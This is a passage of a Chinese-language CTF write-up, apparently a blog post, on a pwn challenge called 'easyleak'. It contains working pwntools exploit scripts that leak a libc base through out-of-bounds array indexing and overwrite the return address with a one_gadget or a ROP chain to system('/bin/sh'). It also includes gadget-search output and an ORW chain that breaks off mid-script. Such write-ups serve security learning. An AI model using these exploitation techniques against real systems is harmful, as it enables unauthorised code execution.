class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write1</span>(<span class=\"params\">index,num</span>):</span><br><span class=\"line\">    high_num = <span class=\"built_in\">int</span>(num/(<span class=\"number\">2</span>**<span class=\"number\">32</span>))</span><br><span class=\"line\">    low_num  = num%(<span class=\"number\">2</span>**<span class=\"number\">32</span>)</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;Num:&quot;</span>,<span class=\"built_in\">str</span>(low_num))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index+<span class=\"number\">1</span>))</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;Num:&quot;</span>,<span class=\"built_in\">str</span>(high_num))</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"one-gadget解法\"><a href=\"#one-gadget解法\" class=\"headerlink\" title=\"one_gadget解法\"></a>one_gadget解法</h2><p>​\t\t题目有给libc版本,但是感觉好像不对啊… 给的是2.27,其实是2.31-0ubuntu9.7_amd64</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@vultr:~/yuesai/easyleak# one_gadget /root/pwn/glibc-all-in-one/libs/<span class=\"number\">2.31</span><span class=\"number\">-0u</span>buntu9<span class=\"number\">.7</span>_amd64/libc.so<span class=\"number\">.6</span></span><br><span class=\"line\"><span class=\"number\">0xe3b2e</span> execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, r15, r12)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [r15] == <span class=\"literal\">NULL</span> || r15 == <span class=\"literal\">NULL</span></span><br><span class=\"line\">  [r12] == <span class=\"literal\">NULL</span> || r12 == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0xe3b31</span> execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, r15, rdx)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [r15] == <span class=\"literal\">NULL</span> || r15 == <span class=\"literal\">NULL</span></span><br><span class=\"line\">  [rdx] == <span class=\"literal\">NULL</span> || rdx == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0xe3b34</span> execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsi, rdx)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsi] == <span class=\"literal\">NULL</span> || rsi == <span class=\"literal\">NULL</span></span><br><span class=\"line\">  [rdx] == <span class=\"literal\">NULL</span> || rdx == <span class=\"literal\">NULL</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mylibc = ELF(<span class=\"string\">&#x27;/root/pwn/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&#x27;</span>)</span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">read1</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;The num: &#x27;</span>)</span><br><span class=\"line\">    low_addr=<span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>,drop=<span class=\"literal\">True</span>),<span class=\"number\">10</span>) <span class=\"comment\"># 这样就可以接收到全部了,不用考虑长度,到\\n截止,10进制接收</span></span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index+<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;The num: &#x27;</span>)</span><br><span class=\"line\">    high_addr=<span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>,drop=<span class=\"literal\">True</span>),<span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> high_addr*(<span class=\"number\">2</span>**<span class=\"number\">32</span>)+low_addr</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write1</span>(<span class=\"params\">index,num</span>):</span><br><span class=\"line\">    high_num = <span class=\"built_in\">int</span>(num/(<span class=\"number\">2</span>**<span class=\"number\">32</span>))</span><br><span class=\"line\">    low_num  = num%(<span class=\"number\">2</span>**<span class=\"number\">32</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Num:&quot;</span>,<span class=\"built_in\">str</span>(low_num))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index+<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Num:&quot;</span>,<span class=\"built_in\">str</span>(high_num))</span><br><span class=\"line\"></span><br><span class=\"line\">libcbase = read1(<span class=\"number\">262</span>) - <span class=\"number\">0x240b3</span></span><br><span class=\"line\"><span class=\"comment\">#print(hex(libcbase3))</span></span><br><span class=\"line\"></span><br><span class=\"line\">onegadget = libcbase + <span class=\"number\">0xe3b31</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">write1(<span class=\"number\">262</span>,onegadget)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t<font color=\"red\">不对不对..其实不是这个libc版本,所以onegadget是瞎猫碰死耗子,撞上了….(或者说他前面的指令不影响后续getshell)</font></p>\n<h2 id=\"system解法\"><a href=\"#system解法\" class=\"headerlink\" title=\"system解法\"></a>system解法</h2><p>找到&#x2F;bin&#x2F;sh和system 以及gadget</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary libc.so<span class=\"number\">.6</span> --only <span class=\"string\">&#x27;pop|ret&#x27;</span> | grep <span class=\"string\">&#x27;rdi&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x00000000000248f2</span> : pop rdi ; pop rbp ; ret</span><br><span class=\"line\"><span class=\"number\">0x0000000000023b6a</span> : pop rdi ; ret</span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">ROPgadget --binary libc.so<span class=\"number\">.6</span>  --<span class=\"built_in\">string</span> <span class=\"string\">&#x27;/bin/sh&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x00000000001b45bd</span> : /bin/sh</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">ROPgadget --binary libc.so<span class=\"number\">.6</span> --only <span class=\"string\">&#x27;ret&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000022679</span> : ret</span><br><span class=\"line\">    </span><br><span class=\"line\">system = libcbase + mylibc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mylibc = ELF(<span class=\"string\">&#x27;/root/pwn/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&#x27;</span>)</span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">read1</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;The num: &#x27;</span>)</span><br><span class=\"line\">    low_addr=<span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>,drop=<span class=\"literal\">True</span>),<span class=\"number\">10</span>) <span class=\"comment\"># 这样就可以接收到全部了,不用考虑长度,到\\n截止,10进制接收</span></span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index+<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;The num: &#x27;</span>)</span><br><span class=\"line\">    high_addr=<span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>,drop=<span class=\"literal\">True</span>),<span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> high_addr*(<span class=\"number\">2</span>**<span class=\"number\">32</span>)+low_addr</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write1</span>(<span class=\"params\">index,num</span>):</span><br><span class=\"line\">    high_num = <span class=\"built_in\">int</span>(num/(<span class=\"number\">2</span>**<span class=\"number\">32</span>))</span><br><span class=\"line\">    low_num  = num%(<span class=\"number\">2</span>**<span class=\"number\">32</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Num:&quot;</span>,<span class=\"built_in\">str</span>(low_num))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index+<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Num:&quot;</span>,<span class=\"built_in\">str</span>(high_num))</span><br><span class=\"line\"></span><br><span class=\"line\">libcbase = read1(<span class=\"number\">262</span>) - <span class=\"number\">0x240b3</span></span><br><span class=\"line\"><span class=\"comment\">#print(hex(libcbase3))</span></span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi = libcbase +<span class=\"number\">0x000000023b72</span></span><br><span class=\"line\">system = libcbase + mylibc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">binsh = libcbase +<span class=\"number\">0x00000000001b45bd</span></span><br><span class=\"line\"></span><br><span class=\"line\">write1(<span class=\"number\">262</span>,pop_rdi)</span><br><span class=\"line\">write1(<span class=\"number\">264</span>,binsh)</span><br><span class=\"line\">write1(<span class=\"number\">266</span>,system)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p><font color=\"red\">这里有个大坑…栈对其? 栈平衡?  是的,需要加一个ret,不过为什么呢??</font></p>\n<p>看了一下出题人用的libc版本:GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9)</p>\n<p>前面onegadget瞎猫碰死耗子..</p>\n<p>会什么会加载四个呢??,比如libc, 减哪个的值呢? 减最开头的</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/image-20230522165144751.png\" alt=\"image-20230522165144751\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/image-20230522170302148.png\" alt=\"image-20230522170302148\"></p>\n<h2 id=\"orw解法\"><a href=\"#orw解法\" class=\"headerlink\" title=\"orw解法\"></a>orw解法</h2><p>​\t\t记录一下……其实没必要..</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;i386&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mylibc = ELF(<span class=\"string\">&#x27;/root/pwn/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6&#x27;</span>)</span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">readone</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">writeone</span>(<span class=\"params\">index,content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Num:&quot;</span>,<span class=\"built_in\">str</span>(content))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">0</span>,<span class=\"number\">1852400175</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">1</span>,<span class=\"number\">6845231</span>)</span><br><span class=\"line\">readone(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">readone(<span class=\"number\">262</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;The num: &quot;</span>)</span><br><span class=\"line\">addr1 = io.recv(<span class=\"number\">10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">readone(<span class=\"number\">263</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;The num: &quot;</span>)</span><br><span class=\"line\">addr2 = io.recv(<span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"comment\">#print(hex(int(addr1)))</span></span><br><span class=\"line\"><span class=\"comment\">#print(hex(int(addr2)))</span></span><br><span class=\"line\"></span><br><span class=\"line\">system = <span class=\"built_in\">int</span>(addr1) - <span class=\"number\">231</span> + <span class=\"number\">0x2d799</span></span><br><span class=\"line\">libcbase = <span class=\"built_in\">int</span>(addr1) - <span class=\"number\">0x21c87</span></span><br><span class=\"line\"><span class=\"comment\">#print(hex(system))</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">readone(<span class=\"number\">270</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;The num: &quot;</span>)</span><br><span class=\"line\">mainlow = io.recv(<span class=\"number\">10</span>)</span><br><span class=\"line\">readone(<span class=\"number\">271</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;The num: &quot;</span>)</span><br><span class=\"line\">mainhigh = io.recv(<span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"comment\">#print(mainhigh)</span></span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi = libcbase + <span class=\"number\">0x002164f</span></span><br><span class=\"line\">pop2 = libcbase+<span class=\"number\">0x022394</span></span><br><span class=\"line\">pop_rsi = libcbase +<span class=\"number\">0x0000023a6a</span></span><br><span class=\"line\">pop_rdx = libcbase + <span class=\"number\">0x001b96</span></span><br><span class=\"line\">writeone(<span class=\"number\">262</span>,pop_rdi)</span><br><span class=\"line\"><span class=\"comment\">#writeone(263,mainhigh)</span></span><br><span class=\"line\"></span><br><span class=\"line\">binsh = libcbase +<span class=\"number\">0x001b3d88</span></span><br><span class=\"line\"><span class=\"comment\">#binsh  = libcbase + mylibc.search(b&quot;/bin/sh&quot;)</span></span><br><span class=\"line\">writeone(<span class=\"number\">264</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">265</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">266</span>,pop_rsi)</span><br><span class=\"line\">writeone(<span class=\"number\">267</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">268</span>,<span class=\"built_in\">int</span>(mainlow)+<span class=\"number\">0x202100</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">269</span>,<span class=\"built_in\">int</span>(mainhigh))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">270</span>,pop_rdx)</span><br><span class=\"line\">writeone(<span class=\"number\">271</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">272</span>,<span class=\"number\">32</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">273</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">read = libcbase + mylibc.symbols[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">writeone(<span class=\"number\">274</span>,read)</span><br><span class=\"line\">writeone(<span class=\"number\">275</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># open</span></span><br><span class=\"line\">writeone(<span class=\"number\">276</span>,pop_rdi)</span><br><span class=\"line\">writeone(<span class=\"number\">277</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">278</span>,<span class=\"built_in\">int</span>(mainlow)+<span class=\"number\">0x202100</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">279</span>,<span class=\"built_in\">int</span>(mainhigh))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">289</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"><span class=\"comment\"># read</span></span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">290</span>,pop_rdi)</span><br><span class=\"line\">writeone(<span class=\"number\">291</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">292</span>,<span class=\"number\">3</span>)</span><br><span class=\"line\">writeone(<span class=\"number\">293</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">294</span>,pop_rsi)</span><br><span class=\"line\">writeone(<span class=\"number\">295</span>,<span class=\"built_in\">int</span>(addr2))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">writeone(<span class=\"number\">296</span>,<span 